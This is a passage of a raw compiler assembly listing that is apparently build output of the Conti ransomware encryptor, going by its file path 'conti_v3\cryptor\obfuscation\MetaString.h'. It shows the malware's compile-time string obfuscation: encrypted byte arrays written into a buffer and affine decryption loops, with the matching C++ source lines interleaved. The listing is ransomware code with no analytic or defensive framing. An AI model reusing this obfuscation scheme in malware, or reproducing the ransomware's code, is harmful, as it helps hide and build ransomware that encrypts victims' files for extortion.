__int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 9e 00 00
	00		 mov	 r10d, 158		; 0000009eH
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 12 00 00 00	 mov	 eax, 18
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3d	 mov	 BYTE PTR [rcx+1], 61	; 0000003dH
  00007	c6 41 02 12	 mov	 BYTE PTR [rcx+2], 18
  0000b	c6 41 03 5b	 mov	 BYTE PTR [rcx+3], 91	; 0000005bH
  0000f	c6 41 04 12	 mov	 BYTE PTR [rcx+4], 18
  00013	c6 41 05 40	 mov	 BYTE PTR [rcx+5], 64	; 00000040H
  00017	c6 41 06 12	 mov	 BYTE PTR [rcx+6], 18
  0001b	c6 41 07 1d	 mov	 BYTE PTR [rcx+7], 29
  0001f	c6 41 08 12	 mov	 BYTE PTR [rcx+8], 18
  00023	c6 41 09 43	 mov	 BYTE PTR [rcx+9], 67	; 00000043H
  00027	c6 41 0a 12	 mov	 BYTE PTR [rcx+10], 18
  0002b	c6 41 0b 7c	 mov	 BYTE PTR [rcx+11], 124	; 0000007cH
  0002f	c6 41 0c 12	 mov	 BYTE PTR [rcx+12], 18
  00033	c6 41 0d 43	 mov	 BYTE PTR [rcx+13], 67	; 00000043H
  00037	c6 41 0e 12	 mov	 BYTE PTR [rcx+14], 18
  0003b	c6 41 0f 72	 mov	 BYTE PTR [rcx+15], 114	; 00000072H
  0003f	c6 41 10 12	 mov	 BYTE PTR [rcx+16], 18
  00043	c6 41 11 20	 mov	 BYTE PTR [rcx+17], 32	; 00000020H
  00047	c6 41 12 12	 mov	 BYTE PTR [rcx+18], 18
  0004b	c6 41 13 3d	 mov	 BYTE PTR [rcx+19], 61	; 0000003dH
  0004f	c6 41 14 12	 mov	 BYTE PTR [rcx+20], 18
  00053	c6 41 15 72	 mov	 BYTE PTR [rcx+21], 114	; 00000072H
  00057	c6 41 16 12	 mov	 BYTE PTR [rcx+22], 18
  0005b	c6 41 17 5c	 mov	 BYTE PTR [rcx+23], 92	; 0000005cH
  0005f	c6 41 18 12	 mov	 BYTE PTR [rcx+24], 18
  00063	c6 41 19 41	 mov	 BYTE PTR [rcx+25], 65	; 00000041H
  00067	c6 41 1a 12	 mov	 BYTE PTR [rcx+26], 18
  0006b	c6 41 1b 28	 mov	 BYTE PTR [rcx+27], 40	; 00000028H
  0006f	c6 41 1c 12	 mov	 BYTE PTR [rcx+28], 18
  00073	c6 41 1d 19	 mov	 BYTE PTR [rcx+29], 25
  00077	c6 41 1e 12	 mov	 BYTE PTR [rcx+30], 18
  0007b	c6 41 1f 4f	 mov	 BYTE PTR [rcx+31], 79	; 0000004fH
  0007f	c6 41 20 12	 mov	 BYTE PTR [rcx+32], 18
  00083	c6 41 21 5e	 mov	 BYTE PTR [rcx+33], 94	; 0000005eH
  00087	c6 41 22 12	 mov	 BYTE PTR [rcx+34], 18
  0008b	c6 41 23 40	 mov	 BYTE PTR [rcx+35], 64	; 00000040H
  0008f	c6 41 24 12	 mov	 BYTE PTR [rcx+36], 18
  00093	c6 41 25 61	 mov	 BYTE PTR [rcx+37], 97	; 00000061H
  00097	c6 41 26 12	 mov	 BYTE PTR [rcx+38], 18
  0009b	c6 41 27 79	 mov	 BYTE PTR [rcx+39], 121	; 00000079H
  0009f	c6 41 28 12	 mov	 BYTE PTR [rcx+40], 18
  000a3	c6 41 29 6d	 mov	 BYTE PTR [rcx+41], 109	; 0000006dH
  000a7	c6 41 2a 12	 mov	 BYTE PTR [rcx+42], 18
  000ab	c6 41 2b 28	 mov	 BYTE PTR [rcx+43], 40	; 00000028H
  000af	c6 41 2c 12	 mov	 BYTE PTR [rcx+44], 18
  000b3	c6 41 2d 0d	 mov	 BYTE PTR [rcx+45], 13
  000b7	c6 41 2e 12	 mov	 BYTE PTR [rcx+46], 18
  000bb	c6 41 2f 00	 mov	 BYTE PTR [rcx+47], 0
  000bf	c6 41 30 12	 mov	 BYTE PTR [rcx+48], 18
  000c3	c6 41 31 6d	 mov	 BYTE PTR [rcx+49], 109	; 0000006dH
  000c7	c6 41 32 12	 mov	 BYTE PTR [rcx+50], 18
  000cb	c6 41 33 70	 mov	 BYTE PTR [rcx+51], 112	; 00000070H
  000cf	c6 41 34 12	 mov	 BYTE PTR [rcx+52], 18
  000d3	c6 41 35 43	 mov	 BYTE PTR [rcx+53], 67	; 00000043H
  000d7	c6 41 36 12	 mov	 BYTE PTR [rcx+54], 18
  000db	c6 41 37 5b	 mov	 BYTE PTR [rcx+55], 91	; 0000005bH
  000df	c6 41 38 12	 mov	 BYTE PTR [rcx+56], 18
  000e3	c6 41 39 2c	 mov	 BYTE PTR [rcx+57], 44	; 0000002cH
  000e7	c6 41 3a 12	 mov	 BYTE PTR [rcx+58], 18
  000eb	c6 41 3b 29	 mov	 BYTE PTR [rcx+59], 41	; 00000029H
  000ef	c6 41 3c 12	 mov	 BYTE PTR [rcx+60], 18
  000f3	c6 41 3d 28	 mov	 BYTE PTR [rcx+61], 40	; 00000028H
  000f7	c6 41 3e 12	 mov	 BYTE PTR [rcx+62], 18
  000fb	c6 41 3f 79	 mov	 BYTE PTR [rcx+63], 121	; 00000079H
  000ff	c6 41 40 12	 mov	 BYTE PTR [rcx+64], 18
  00103	c6 41 41 3a	 mov	 BYTE PTR [rcx+65], 58	; 0000003aH
  00107	c6 41 42 12	 mov	 BYTE PTR [rcx+66], 18
  0010b	c6 41 43 43	 mov	 BYTE PTR [rcx+67], 67	; 00000043H
  0010f	c6 41 44 12	 mov	 BYTE PTR [rcx+68], 18
  00113	c6 41 45 5b	 mov	 BYTE PTR [rcx+69], 91	; 0000005bH
  00117	c6 41 46 12	 mov	 BYTE PTR [rcx+70], 18
  0011b	c6 41 47 28	 mov	 BYTE PTR [rcx+71], 40	; 00000028H
  0011f	c6 41 48 12	 mov	 BYTE PTR [rcx+72], 18
  00123	c6 41 49 19	 mov	 BYTE PTR [rcx+73], 25
  00127	c6 41 4a 12	 mov	 BYTE PTR [rcx+74], 18
  0012b	c6 41 4b 7a	 mov	 BYTE PTR [rcx+75], 122	; 0000007aH
  0012f	c6 41 4c 12	 mov	 BYTE PTR [rcx+76], 18
  00133	c6 41 4d 6e	 mov	 BYTE PTR [rcx+77], 110	; 0000006eH
  00137	c6 41 4e 12	 mov	 BYTE PTR [rcx+78], 18
  0013b	c6 41 4f 5c	 mov	 BYTE PTR [rcx+79], 92	; 0000005cH
  0013f	c6 41 50 12	 mov	 BYTE PTR [rcx+80], 18

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00143	c6 41 51 1d	 mov	 BYTE PTR [rcx+81], 29
  00147	c6 41 52 12	 mov	 BYTE PTR [rcx+82], 18
  0014b	c6 41 53 43	 mov	 BYTE PTR [rcx+83], 67	; 00000043H
  0014f	c6 41 54 12	 mov	 BYTE PTR [rcx+84], 18
  00153	c6 41 55 7c	 mov	 BYTE PTR [rcx+85], 124	; 0000007cH
  00157	c6 41 56 12	 mov	 BYTE PTR [rcx+86], 18
  0015b	c6 41 57 43	 mov	 BYTE PTR [rcx+87], 67	; 00000043H
  0015f	c6 41 58 12	 mov	 BYTE PTR [rcx+88], 18
  00163	c6 41 59 72	 mov	 BYTE PTR [rcx+89], 114	; 00000072H
  00167	c6 41 5a 12	 mov	 BYTE PTR [rcx+90], 18
  0016b	c6 41 5b 6d	 mov	 BYTE PTR [rcx+91], 109	; 0000006dH
  0016f	c6 41 5c 12	 mov	 BYTE PTR [rcx+92], 18
  00173	c6 41 5d 4c	 mov	 BYTE PTR [rcx+93], 76	; 0000004cH
  00177	c6 41 5e 12	 mov	 BYTE PTR [rcx+94], 18
  0017b	c6 41 5f 37	 mov	 BYTE PTR [rcx+95], 55	; 00000037H
  0017f	c6 41 60 12	 mov	 BYTE PTR [rcx+96], 18
  00183	c6 41 61 40	 mov	 BYTE PTR [rcx+97], 64	; 00000040H
  00187	c6 41 62 12	 mov	 BYTE PTR [rcx+98], 18
  0018b	c6 41 63 61	 mov	 BYTE PTR [rcx+99], 97	; 00000061H
  0018f	c6 41 64 12	 mov	 BYTE PTR [rcx+100], 18
  00193	c6 41 65 79	 mov	 BYTE PTR [rcx+101], 121	; 00000079H
  00197	c6 41 66 12	 mov	 BYTE PTR [rcx+102], 18
  0019b	c6 41 67 3d	 mov	 BYTE PTR [rcx+103], 61	; 0000003dH
  0019f	c6 41 68 12	 mov	 BYTE PTR [rcx+104], 18
  001a3	c6 41 69 61	 mov	 BYTE PTR [rcx+105], 97	; 00000061H
  001a7	c6 41 6a 12	 mov	 BYTE PTR [rcx+106], 18
  001ab	c6 41 6b 64	 mov	 BYTE PTR [rcx+107], 100	; 00000064H
  001af	c6 41 6c 12	 mov	 BYTE PTR [rcx+108], 18
  001b3	c6 41 6d 00	 mov	 BYTE PTR [rcx+109], 0
  001b7	c6 41 6e 12	 mov	 BYTE PTR [rcx+110], 18
  001bb	c6 41 6f 72	 mov	 BYTE PTR [rcx+111], 114	; 00000072H
  001bf	c6 41 70 12	 mov	 BYTE PTR [rcx+112], 18
  001c3	c6 41 71 79	 mov	 BYTE PTR [rcx+113], 121	; 00000079H
  001c7	c6 41 72 12	 mov	 BYTE PTR [rcx+114], 18
  001cb	c6 41 73 4c	 mov	 BYTE PTR [rcx+115], 76	; 0000004cH
  001cf	c6 41 74 12	 mov	 BYTE PTR [rcx+116], 18
  001d3	c6 41 75 43	 mov	 BYTE PTR [rcx+117], 67	; 00000043H
  001d7	c6 41 76 12	 mov	 BYTE PTR [rcx+118], 18
  001db	c6 41 77 6a	 mov	 BYTE PTR [rcx+119], 106	; 0000006aH
  001df	c6 41 78 12	 mov	 BYTE PTR [rcx+120], 18
  001e3	c6 41 79 43	 mov	 BYTE PTR [rcx+121], 67	; 00000043H
  001e7	c6 41 7a 12	 mov	 BYTE PTR [rcx+122], 18
  001eb	c6 41 7b 72	 mov	 BYTE PTR [rcx+123], 114	; 00000072H
  001ef	c6 41 7c 12	 mov	 BYTE PTR [rcx+124], 18
  001f3	c6 41 7d 78	 mov	 BYTE PTR [rcx+125], 120	; 00000078H
  001f7	c6 41 7e 12	 mov	 BYTE PTR [rcx+126], 18
  001fb	c6 41 7f 6e	 mov	 BYTE PTR [rcx+127], 110	; 0000006eH
  001ff	c6 81 80 00 00
	00 12		 mov	 BYTE PTR [rcx+128], 18
  00206	c6 81 81 00 00
	00 5f		 mov	 BYTE PTR [rcx+129], 95	; 0000005fH
  0020d	c6 81 82 00 00
	00 12		 mov	 BYTE PTR [rcx+130], 18
  00214	c6 81 83 00 00
	00 4a		 mov	 BYTE PTR [rcx+131], 74	; 0000004aH
  0021b	c6 81 84 00 00
	00 12		 mov	 BYTE PTR [rcx+132], 18
  00222	c6 81 85 00 00
	00 08		 mov	 BYTE PTR [rcx+133], 8
  00229	c6 81 86 00 00
	00 12		 mov	 BYTE PTR [rcx+134], 18
  00230	c6 81 87 00 00
	00 02		 mov	 BYTE PTR [rcx+135], 2
  00237	c6 81 88 00 00
	00 12		 mov	 BYTE PTR [rcx+136], 18
  0023e	c6 81 89 00 00
	00 6d		 mov	 BYTE PTR [rcx+137], 109	; 0000006dH
  00245	c6 81 8a 00 00
	00 12		 mov	 BYTE PTR [rcx+138], 18
  0024c	c6 81 8b 00 00
	00 08		 mov	 BYTE PTR [rcx+139], 8
  00253	c6 81 8c 00 00
	00 12		 mov	 BYTE PTR [rcx+140], 18
  0025a	c6 81 8d 00 00
	00 78		 mov	 BYTE PTR [rcx+141], 120	; 00000078H
  00261	c6 81 8e 00 00
	00 12		 mov	 BYTE PTR [rcx+142], 18
  00268	c6 81 8f 00 00
	00 72		 mov	 BYTE PTR [rcx+143], 114	; 00000072H
  0026f	c6 81 90 00 00
	00 12		 mov	 BYTE PTR [rcx+144], 18
  00276	c6 81 91 00 00
	00 40		 mov	 BYTE PTR [rcx+145], 64	; 00000040H
  0027d	c6 81 92 00 00
	00 12		 mov	 BYTE PTR [rcx+146], 18
  00284	c6 81 93 00 00
	00 43		 mov	 BYTE PTR [rcx+147], 67	; 00000043H
  0028b	c6 81 94 00 00
	00 12		 mov	 BYTE PTR [rcx+148], 18
  00292	c6 81 95 00 00
	00 58		 mov	 BYTE PTR [rcx+149], 88	; 00000058H
  00299	c6 81 96 00 00
	00 12		 mov	 BYTE PTR [rcx+150], 18
  002a0	c6 81 97 00 00
	00 43		 mov	 BYTE PTR [rcx+151], 67	; 00000043H
  002a7	c6 81 98 00 00
	00 12		 mov	 BYTE PTR [rcx+152], 18
  002ae	c6 81 99 00 00
	00 70		 mov	 BYTE PTR [rcx+153], 112	; 00000070H
  002b5	c6 81 9a 00 00
	00 12		 mov	 BYTE PTR [rcx+154], 18
  002bc	c6 81 9b 00 00
	00 43		 mov	 BYTE PTR [rcx+155], 67	; 00000043H
  002c3	c6 81 9c 00 00
	00 12		 mov	 BYTE PTR [rcx+156], 18
  002ca	c6 81 9d 00 00
	00 12		 mov	 BYTE PTR [rcx+157], 18
  002d1	c6 81 9e 00 00
	00 12		 mov	 BYTE PTR [rcx+158], 18
  002d8	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]

; 52   :     {
; 53   : 
; 54   :     }

  002dc	48 8b c1	 mov	 rax, rcx
  002df	c3		 ret	 0
??0?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 06 00 00
	00		 mov	 r11d, 6
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 5d	 sub	 ecx, 93			; 0000005dH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
